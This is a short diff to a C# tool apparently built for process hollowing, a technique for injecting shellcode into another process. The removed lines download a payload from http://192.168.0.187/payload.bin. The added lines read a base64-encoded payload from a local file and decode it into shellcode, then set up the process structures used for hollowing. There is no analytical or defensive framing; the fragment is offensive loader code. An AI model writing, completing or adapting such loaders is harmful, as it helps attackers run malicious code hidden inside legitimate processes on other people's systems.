@@ -1,4 +1,5 @@
 ﻿using System.Runtime.InteropServices;
+using System.Text;
 using System.Text.RegularExpressions;
 using Microsoft.Win32;
 
@@ -73,12 +74,9 @@ namespace CShellHollowingTesting
 
     static async Task Main(string[] args)
     {
-      List<byte> shellcodeList = new List<byte>();
+      var base64payload = File.ReadAllText("payload");
+      var shellcode = Convert.FromBase64String(base64payload);
 
-      var httpClient = new HttpClient();
-      var shellcode = await httpClient.GetByteArrayAsync("http://192.168.0.187/payload.bin");
-
-      Console.WriteLine("Fetched");
       PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
       STARTUPINFO startup_info = new STARTUPINFO();
       PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
